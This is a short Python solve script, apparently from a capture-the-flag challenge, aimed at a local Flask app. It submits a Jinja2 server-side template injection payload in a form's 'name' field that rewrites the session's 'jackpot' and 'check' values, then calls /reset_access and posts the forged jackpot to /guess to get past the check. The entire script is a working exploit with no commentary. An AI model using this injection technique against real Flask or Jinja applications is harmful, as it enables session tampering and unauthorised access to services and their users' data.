import requests

s = requests.Session()

URL = 'http://127.0.0.1:5000'

s.post(URL, data = {'name': r'{% set x = session.update({"jackpot": "to^", "check": "access"}) %}', 'ok': 'cc'}, timeout = 1)

r = s.get(URL + '/reset_access')
#print(r.text)
r = s.post(URL + '/guess', data = {'jackpot': 'to^'})
print(r.text)
